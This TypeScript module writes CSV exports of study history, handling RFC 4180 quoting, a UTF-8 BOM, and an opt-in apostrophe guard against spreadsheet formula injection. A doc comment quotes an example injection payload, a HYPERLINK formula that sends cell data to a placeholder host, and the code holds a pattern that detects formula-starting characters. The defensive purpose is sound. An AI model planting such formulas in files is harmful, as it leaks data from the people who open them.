/**
 * CSV writer for "Export study history" (spec §8.8) — PURE.
 *
 * The output follows RFC 4180, the common CSV standard, so Excel, Numbers,
 * Google Sheets and Anki all read it the same way:
 *   - fields are separated by commas, records (rows) by CRLF ("\r\n");
 *   - a field that contains a comma, a double quote, a CR or an LF is put in
 *     double quotes, and each double quote inside it is written twice
 *     (He said "hi"  →  "He said ""hi""");
 *   - the first row is the header row.
 *
 * The text starts with a UTF-8 BOM (byte order mark, the invisible character
 * U+FEFF). Without it, Excel guesses an old encoding and shows "über" as
 * "Ã¼ber". Spreadsheet apps that do not need the BOM ignore it.
 *
 * Example:
 *   toCsv(['date', 'cards'], [['2026-10-21', 12]])
 *   // → '\uFEFFdate,cards\r\n2026-10-21,12\r\n'
 *
 * Formula guard (opt-in): Excel, Numbers and Google Sheets run a cell that
 * starts with = + - or @ as a FORMULA. Text from an imported deck could be
 * `=HYPERLINK("http://x/?"&A1,"open")`, which becomes a live link when the
 * learner opens the file. With `{ guardFormulas: true }` such a TEXT cell gets
 * a leading apostrophe ('), which spreadsheet apps read as "this is text".
 * The history export turns it on. A file that is meant to be imported again
 * (for example a deck export) leaves it off, because there the apostrophe
 * would become part of the value.
 *
 *   toCsv(['front'], [['=1+1']], { guardFormulas: true, bom: false })
 *   // → "front\r\n'=1+1\r\n"
 */

/** One cell. null and undefined become an empty cell. */
export type CsvValue = string | number | boolean | null | undefined;

/**
 * The UTF-8 byte order mark. As a JS string it is one character; the file gets
 * the bytes EF BB BF. Written as an escape ('\uFEFF') because the character
 * itself is invisible in an editor.
 */
export const CSV_BOM = '\uFEFF';

/** The record separator of RFC 4180. */
export const CSV_EOL = '\r\n';

/** A field with one of these characters must be quoted. */
const NEEDS_QUOTES = /[",\r\n]/;

/**
 * A text cell that starts with one of these is run as a formula by spreadsheet
 * apps: = + - @, and also a TAB or a CR (some apps skip them and then see the
 * formula). This is the list from the OWASP advice on "CSV injection".
 */
const FORMULA_START = /^[=+\-@\t\r]/;

/** Options for one cell (and for one row). */
export interface CsvFieldOptions {
  /**
   * Put an apostrophe (') before a TEXT value that starts like a formula (see
   * FORMULA_START), so a spreadsheet shows it as text. Numbers and booleans
   * are never changed: -3 stays -3. Default false.
   */
  guardFormulas?: boolean;
}

/**
 * One cell as CSV text. Quotes it only when needed (RFC 4180, rule 6–7).
 * A number that is not finite (NaN, Infinity) becomes an empty cell, so a
 * broken value never shows as the word "NaN" in a spreadsheet.
 *
 * With `guardFormulas`, the STRING '-3' is guarded ("'-3"), but the NUMBER -3
 * is not. So pass numbers as numbers.
 */
export function csvField(value: CsvValue, options: CsvFieldOptions = {}): string {
  if (value === null || value === undefined) return '';
  let text = typeof value === 'number' ? (Number.isFinite(value) ? String(value) : '') : String(value);
  if (options.guardFormulas === true && typeof value === 'string' && FORMULA_START.test(text)) {
    text = `'${text}`;
  }
  return NEEDS_QUOTES.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

/** One record (row) as CSV text, without the line end. */
export function csvRow(values: readonly CsvValue[], options: CsvFieldOptions = {}): string {
  // An arrow function on purpose: `values.map(csvField)` would pass the array
  // INDEX as the second argument (the options).
  return values.map((value) => csvField(value, options)).join(',');
}

export interface CsvOptions extends CsvFieldOptions {
  /** Start with the UTF-8 BOM. Default true. */
  bom?: boolean;
}

/**
 * A whole CSV file: the header row, then one row per record. Every record
 * ends with CRLF (the last one too).
 *
 * Throws when a row has a different number of cells than the header: RFC 4180
 * says every record has the same number of fields, and a short row would
 * silently move values into the wrong column.
 */
export function toCsv(
  header: readonly string[],
  rows: readonly (readonly CsvValue[])[],
  options: CsvOptions = {},
): string {
  if (header.length === 0) throw new Error('toCsv: the header row is empty');
  rows.forEach((row, i) => {
    if (row.length !== header.length) {
      throw new Error(`toCsv: row ${i + 1} has ${row.length} cells, but the header has ${header.length}`);
    }
  });
  const cell: CsvFieldOptions = { guardFormulas: options.guardFormulas === true };
  const records = [csvRow(header, cell), ...rows.map((row) => csvRow(row, cell))];
  const bom = options.bom === false ? '' : CSV_BOM;
  return bom + records.join(CSV_EOL) + CSV_EOL;
}
